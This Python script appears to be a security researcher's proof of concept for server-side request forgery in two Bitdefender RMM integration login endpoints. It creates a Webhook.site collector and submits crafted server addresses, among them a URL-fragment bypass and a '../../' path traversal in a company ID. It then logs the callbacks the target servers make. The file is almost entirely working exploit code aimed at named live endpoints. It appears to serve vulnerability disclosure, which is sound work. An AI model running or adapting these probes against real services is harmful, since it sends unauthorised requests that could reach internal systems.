#!/usr/bin/env python3
"""Show the complete observable exchanges for the two Bitdefender SSRF PoCs.

Usage:
    python findings/inspect-ssrf.py datto
    python findings/inspect-ssrf.py cwpsa
    python findings/inspect-ssrf.py datto --response-file my-response.json

Only researcher-owned Webhook.site destinations and dummy integration keys are
used. Requires `pip install requests`. A full JSON transcript is saved in tmp/.
"""

import argparse
import json
import re
import sys
import time
import uuid
from datetime import datetime, timezone
from pathlib import Path

import requests


WEBHOOK_API = "https://webhook.site"
DATTO_URL = "https://datto.rmm.bitdefender.com/api/user/signIn"
CWPSA_URL = "https://cwpsa.rmm.bitdefender.com/login"


def response_record(response: requests.Response) -> dict:
    return {
        "status": response.status_code,
        "url": response.url,
        "headers": dict(response.headers),
        "body": response.text,
    }


def print_response(label: str, record: dict) -> None:
    print(f"\n=== {label}: HTTP {record['status']} ===")
    print("URL:", record["url"])
    print("Headers:\n" + json.dumps(record["headers"], indent=2, ensure_ascii=False))
    print("Body:\n" + (record["body"] or "<empty>"))


def default_body(bug: str, nonce: str) -> tuple[str, str]:
    marker = "owned-inspect-" + nonce
    if bug == "datto":
        body = {"access_token": marker, "token_type": "Bearer", "expires_in": 60}
    else:
        body = {
            "CompanyName": marker,
            "CompanyID": "direct-" + nonce,
            "Codebase": "v4_6_release/",
            "VersionCode": "v2026.1",
            "VersionNumber": "v4.6.99999",
            "IsCloud": False,
        }
    return json.dumps(body), marker


def create_collector(session: requests.Session, status: int, content_type: str,
                     body: str) -> str:
    response = session.post(
        WEBHOOK_API + "/token",
        json={
            "default_status": status,
            "default_content": body,
            "default_content_type": content_type,
        },
        timeout=15,
    )
    response.raise_for_status()
    return response.json()["uuid"]


def captured_requests(session: requests.Session, token: str) -> list[dict]:
    response = session.get(
        f"{WEBHOOK_API}/token/{token}/requests?sorting=oldest&per_page=100",
        timeout=15,
    )
    response.raise_for_status()
    return response.json().get("data", [])


def datto_probe(session: requests.Session, collector_url: str, nonce: str) -> list[dict]:
    exchanges = []
    for label, address, key in (
        ("Datto control (plain URL)", collector_url, "dummy-control-" + nonce),
        ("Datto SSRF probe", f"{collector_url}/poc-{nonce}?marker={nonce}#x.centrastage.net",
         "dummy-probe-" + nonce),
    ):
        response = session.post(
            DATTO_URL,
            json={
                "rmmApiKey": key,
                "rmmApiSecret": key,
                "rmmServerAddress": address,
            },
            timeout=25,
            allow_redirects=False,
        )
        record = response_record(response)
        print("\nSubmitted rmmServerAddress:", address)
        print_response(label, record)
        exchanges.append({"label": label, "submitted_address": address, **record})
    return exchanges


def csrf_token(session: requests.Session) -> str:
    response = session.get(CWPSA_URL, timeout=15)
    response.raise_for_status()
    match = re.search(
        r'<input[^>]*name="__RequestVerificationToken"[^>]*value="([^"]+)"',
        response.text,
        re.IGNORECASE | re.DOTALL,
    )
    if not match:
        raise RuntimeError("ConnectWise login page did not provide an anti-CSRF token")
    return match.group(1)


def cwpsa_probe(session: requests.Session, collector_url: str, nonce: str) -> list[dict]:
    exchanges = []
    for label, company_id in (
        ("ConnectWise direct URL", "direct-" + nonce),
        ("ConnectWise path traversal", "../../path-" + nonce),
    ):
        response = session.post(
            CWPSA_URL,
            data={
                "SsoAlias": "",
                "ManageUrl": collector_url,
                "ManageCompanyId": company_id,
                "ManagePublicKey": "dummy-public-" + nonce,
                "ManagePrivateKey": "dummy-private-" + nonce,
                "__RequestVerificationToken": csrf_token(session),
            },
            timeout=25,
            allow_redirects=False,
        )
        record = response_record(response)
        print("\nSubmitted ManageUrl:", collector_url)
        print("Submitted ManageCompanyId:", company_id)
        print_response(label, record)
        exchanges.append({"label": label, "submitted_address": collector_url,
                          "company_id": company_id, **record})
    return exchanges


def callback_matches(bug: str, events: list[dict], nonce: str) -> bool:
    if bug == "datto":
        return any(event.get("method") == "POST" and f"/poc-{nonce}" in event.get("url", "")
                   for event in events)
    return (
        any(event.get("method") == "GET" and f"/login/companyinfo/direct-{nonce}" in event.get("url", "")
            for event in events)
        and any(event.get("method") == "GET" and f"/path-{nonce}" in event.get("url", "")
                for event in events)
    )


def poll_callbacks(session: requests.Session, token: str, bug: str,
                   nonce: str, seconds: int) -> list[dict]:
    deadline = time.monotonic() + seconds
    events = []
    first_match_at = None
    while time.monotonic() < deadline:
        events = captured_requests(session, token)
        if callback_matches(bug, events, nonce):
            if first_match_at is None:
                first_match_at = time.monotonic()
            # Give Datto time to make the optional second, bearer-token request.
            if bug != "datto" or any(
                event.get("method") == "GET" and f"/poc-{nonce}" in event.get("url", "")
                for event in events
            ) or time.monotonic() - first_match_at >= 3:
                break
        time.sleep(1)
    return events


def main() -> int:
    parser = argparse.ArgumentParser(
        description=__doc__, formatter_class=argparse.RawDescriptionHelpFormatter)
    parser.add_argument("bug", choices=("datto", "cwpsa"))
    parser.add_argument("--response-file", type=Path,
                        help="UTF-8 body to serve from your collector instead of the default JSON")
    parser.add_argument("--response-status", type=int, default=200)
    parser.add_argument("--response-content-type", default="application/json")
    parser.add_argument("--match", help="Text to check for in Bitdefender's response body")
    parser.add_argument("--wait", type=int, default=15,
                        help="Seconds to poll for callbacks (default: 15)")
    parser.add_argument("--output", type=Path,
                        help="JSON transcript path (default: ignored tmp/ folder)")
    args = parser.parse_args()
    if not 200 <= args.response_status <= 599 or args.wait < 1 or args.wait > 60:
        parser.error("response status must be 200-599 and --wait must be 1-60")

    nonce = uuid.uuid4().hex[:12]
    body, default_marker = default_body(args.bug, nonce)
    if args.response_file:
        body = args.response_file.read_text(encoding="utf-8")
    marker = args.match or (None if args.response_file else default_marker)
    output = args.output or Path("tmp") / f"ssrf-inspect-{args.bug}-{nonce}.json"
    session = requests.Session()
    token = create_collector(session, args.response_status,
                             args.response_content_type, body)
    collector_url = f"https://{token}.webhook.site"

    # Verify Webhook.site actually serves the configured response before probing.
    own_check = session.get(f"{collector_url}/self-check-{nonce}", timeout=15)
    own_response = response_record(own_check)
    print("Collector URL:", collector_url)
    print_response("Collector response, verified locally", own_response)
    if own_check.status_code != args.response_status or own_check.text != body:
        print("Collector did not serve the configured response; no Bitdefender probe sent.",
              file=sys.stderr)
        return 2

    exchanges = (datto_probe(session, collector_url, nonce)
                 if args.bug == "datto" else cwpsa_probe(session, collector_url, nonce))
    events = poll_callbacks(session, token, args.bug, nonce, args.wait)
    target_events = [event for event in events
                     if f"self-check-{nonce}" not in event.get("url", "")]
    print(f"\n=== Collector captured {len(target_events)} server-side request(s) ===")
    for event in target_events:
        print("\nTime:", event.get("created_at"))
        print("Source IP:", event.get("ip"))
        print("Request:", event.get("method"), event.get("url"))
        print("Headers:\n" + json.dumps(event.get("headers", {}), indent=2,
                                         ensure_ascii=False))
        print("Body:\n" + (event.get("content") or "<empty>"))

    reflected = (any(marker in item["body"] for item in exchanges)
                 if marker else None)
    if marker:
        print("\nResponse marker visible in Bitdefender's HTTP response:",
              "YES" if reflected else "NO")
    print("Callback proof:", "VERIFIED" if callback_matches(args.bug, events, nonce)
          else "NOT OBSERVED")
    print("The collector shows the response it served. The Bitdefender endpoints do not"
          " expose the fetched body from an unrelated destination in these tests.")

    transcript = {
        "observed_utc": datetime.now(timezone.utc).isoformat(),
        "bug": args.bug,
        "collector_url": collector_url,
        "collector_configured_response": {
            "status": args.response_status,
            "content_type": args.response_content_type,
            "body": body,
        },
        "collector_self_check": own_response,
        "bitdefender_exchanges": exchanges,
        "collector_events": events,
        "callback_verified": callback_matches(args.bug, events, nonce),
        "response_marker": marker,
        "response_marker_reflected": reflected,
    }
    output.parent.mkdir(parents=True, exist_ok=True)
    output.write_text(json.dumps(transcript, indent=2, ensure_ascii=False),
                      encoding="utf-8")
    print("Full JSON transcript:", output.resolve())
    return 0 if transcript["callback_verified"] else 1


if __name__ == "__main__":
    try:
        raise SystemExit(main())
    except (requests.RequestException, RuntimeError, OSError, ValueError) as exc:
        print(f"Inspector error: {exc}", file=sys.stderr)
        raise SystemExit(2)
